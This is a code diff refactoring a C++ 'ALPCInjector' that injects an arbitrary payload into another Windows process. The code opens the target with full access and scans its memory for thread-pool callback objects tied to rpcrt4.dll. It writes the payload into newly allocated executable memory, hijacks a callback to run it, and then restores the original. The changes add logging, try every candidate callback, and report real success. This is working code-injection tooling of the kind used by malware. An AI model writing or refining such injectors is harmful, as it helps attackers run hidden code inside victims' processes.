@@ -7,7 +7,8 @@
 #include <functional>
 #include <Psapi.h>
 #include <nttpp.h>
-
+#include <algorithm>
+#include <spdlog/spdlog.h>
 #include "ALPCInjector.hpp"
 
 /**
@@ -23,24 +24,31 @@
  */
 InjectionResult ALPCInjector::Inject(DWORD PID, std::vector<unsigned char> payload)
 {
-
+    bool bDidSucess = false;
+    spdlog::info("Attempting to inject into {} a payload of {} bytes.", PID, payload.size());
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-    if (!hProcess)
+    if (!hProcess){
+         spdlog::critical("Invalid process handle provided ({})", hProcess);
         return InjectionResult::INVALID_PROC_HANDLE;
+    }
 
-    IterateSections([&](MEMORY_BASIC_INFORMATION section)
-                    {
-        auto callback = FindCallback(section);
-        if (callback.has_value()){
-            std::cout << "Got valid callback location at " << callback.value().first << std::endl;
-            if (ExecutePayload(callback.value().first, callback.value().second, payload))
-                return true;
+    IterateSections([&](MEMORY_BASIC_INFORMATION section){
+                    
+        auto callbacks = FindCallbacks(section);
+        if (!callbacks.empty()){
+             spdlog::info("Got {} viable callback locations.",  callbacks.size());
+
+            for(auto& callback : callbacks){
+                if (ExecutePayload(callback.first, callback.second, payload)){
+                    bDidSucess = true;
+                    return true;
+                }
+            }
         }
 
-        return false; });
+        return false;});
 
-    //std::cout << "Failed to execute payload in any sections!" << std::endl;
-    return InjectionResult::SUCESFULLY;
+    return bDidSucess ? InjectionResult::SUCESFULLY : InjectionResult::UNSUCCSFULL_PAYLOAD_DEPLOY;
 }
 
 /**
@@ -86,6 +94,16 @@ void ALPCInjector::IterateSections(const std::function<bool(MEMORY_BASIC_INFORMA
     }
 }
 
+/**
+ * The function `IsValidTCO` checks if a given `PTP_CALLBACK_OBJECT` is valid by verifying the
+ * properties of its member variables.
+ * 
+ * @param tco The parameter `tco` is of type `PTP_CALLBACK_OBJECT`, which is a pointer to a structure
+ * representing a thread pool callback object reversed from ntlib.
+ * 
+ * @return a boolean value indicating whether the given TCO (TP_CALLBACK_OBJECT) is valid or not. If
+ * the TCO is valid, the function returns true. Otherwise, it returns false.
+ */
 bool ALPCInjector::IsValidTCO(PTP_CALLBACK_OBJECT tco)
 {
     MEMORY_BASIC_INFORMATION mbi;
@@ -147,23 +165,26 @@ bool ALPCInjector::IsValidTCO(PTP_CALLBACK_OBJECT tco)
  * 
  * @return an optional object that contains a pair of a void pointer and a PTP_CALLBACK_OBJECT pointer.
  */
-std::optional<std::pair<void *, PTP_CALLBACK_OBJECT>> ALPCInjector::FindCallback(MEMORY_BASIC_INFORMATION mbi)
+std::vector<std::pair<void*, TP_CALLBACK_OBJECT>> ALPCInjector::FindCallbacks(MEMORY_BASIC_INFORMATION mbi)
 {
+    std::vector<std::pair<void*, TP_CALLBACK_OBJECT>> _good;
+
+
     LPBYTE addr = (LPBYTE)mbi.BaseAddress;
 
-    std::cout << "Searching callback on section from " << (void*)addr << " to " <<  (void*)(addr + mbi.RegionSize) << std::endl;
+    spdlog::debug("Scannning section {} from {} to {}.", (int)mbi.PartitionId, fmt::ptr((mbi.BaseAddress)), fmt::ptr((void*)((uint64_t)mbi.BaseAddress + mbi.RegionSize) ) );
 
     size_t pos;
     bool bRead, bFound = FALSE;
     size_t rd;
-    TP_CALLBACK_OBJECT tco;
+  
     char filename[MAX_PATH];
 
     // scan memory for TCO
     for (pos = 0; pos < mbi.RegionSize;
-         pos += (bFound ? sizeof(tco) : sizeof(ULONG_PTR)))
+         pos += 4)
     {
-        bFound = FALSE;
+         TP_CALLBACK_OBJECT tco;
         // try read TCO from writeable memory
         bRead = ReadProcessMemory(hProcess,
                                   &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);
@@ -184,19 +205,35 @@ std::optional<std::pair<void *, PTP_CALLBACK_OBJECT>> ALPCInjector::FindCallback
             GetMappedFileName(hProcess,
                               (LPVOID)tco.Callback.Function, filename, MAX_PATH);
 
-            std::cout << "got valid tco on filename " << std::string(filename) << std::endl;
-            if (std::string(filename).find("rpcrt4.dll") != std::string::npos){
-                std::cout << "Found RPCRT4.dll map file!" << std::endl;
-                return { std::pair<void *, PTP_CALLBACK_OBJECT>(addr + pos, &tco)};
+            auto _str_filename = std::string(filename);
+
+            std::transform(_str_filename.begin(), _str_filename.end(), _str_filename.begin(),
+                   [](unsigned char c){ return std::tolower(c); });
+
+            if (_str_filename.find("rpcrt4") != std::string::npos){
+                _good.push_back({addr + pos, tco});
             }
         }
     }
-    return {};
+    return _good;
 }
 
-bool ALPCInjector::ExecutePayload(void *address, PTP_CALLBACK_OBJECT tco, std::vector<unsigned char> buffer)
+/**
+ * The function `ExecutePayload` attempts to execute a payload at a specified callback address in a
+ * remote process.
+ * 
+ * @param address The `address` parameter is a void pointer that represents the address of the callback
+ * function where the payload will be injected.
+ * @param tco The parameter `tco` is of type `TP_CALLBACK_OBJECT` and represents a callback object. It
+ * contains information about the callback function and its associated context.
+ * @param buffer The `buffer` parameter is a vector of unsigned char that contains the payload data to
+ * be executed. It is written to the remote process using the `WriteProcessMemory` function.
+ * 
+ * @return a boolean value.
+ */
+bool ALPCInjector::ExecutePayload(void *address, TP_CALLBACK_OBJECT tco, std::vector<unsigned char> buffer)
 {
-    std::cout << "Trying to execute payload at addr " << address  << std::endl;
+    
     LPVOID cs = NULL;
     bool bStatus = false;
     TP_CALLBACK_OBJECT cpy;
@@ -204,22 +241,24 @@ bool ALPCInjector::ExecutePayload(void *address, PTP_CALLBACK_OBJECT tco, std::v
     SIZE_T wr;
     HANDLE phPrinter = NULL;
 
+    spdlog::debug("Trying to execute payload at callback {}.", fmt::ptr(address));
+
     // allocate memory in remote for payload and callback parameter
     cs = VirtualAllocEx(hProcess, NULL, buffer.size() + sizeof(TP_SIMPLE_CALLBACK),
                         MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
+     spdlog::debug("Allocated mem at addr {}.", fmt::ptr((void*)cs));
     if (cs == nullptr){
-        std::cout << "Couldn't not allocate memory in target process (hProcess:" << (int)hProcess << ")" << std::endl;
+        spdlog::critical("Couldn't not allocate memory in target process (hProcess:{})", (int)hProcess);
         return false;
     }
-
-    std::cout << "Alocated memory in remote process at " << cs << std::endl;
+    
     if (cs != NULL)
     {
         // write payload to remote process
         WriteProcessMemory(hProcess, cs, buffer.data(), buffer.size(), &wr);
         // backup original callback object
-        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
+        CopyMemory(&cpy, &tco, sizeof(TP_CALLBACK_OBJECT));
         // copy original callback address and parameter
         tp.Function = cpy.Callback.Function;
         tp.Context = cpy.Callback.Context;
@@ -237,11 +276,17 @@ bool ALPCInjector::ExecutePayload(void *address, PTP_CALLBACK_OBJECT tco, std::v
         // read back the TCO
         ReadProcessMemory(hProcess, address, &cpy, sizeof(cpy), &wr);
         // restore the original tco
-        WriteProcessMemory(hProcess, address, tco, sizeof(cpy), &wr);
+        WriteProcessMemory(hProcess, address, &tco, sizeof(cpy), &wr);
         // if callback pointer is the original, we succeeded.
-        bStatus = (cpy.Callback.Function == tco->Callback.Function);
+
+        bStatus = (cpy.Callback.Function == tco.Callback.Function);
         // release memory for payload
         VirtualFreeEx(hProcess, cs, buffer.size(), MEM_RELEASE);
     }
-    return true;
+    if (!bStatus)
+        spdlog::debug("No success in deploying payload at callback {}. Hope we success next time.", fmt::ptr(address));
+    else{
+          spdlog::debug("Succesfully deployed payload at {}.", fmt::ptr(address));
+    }
+    return bStatus;
 }
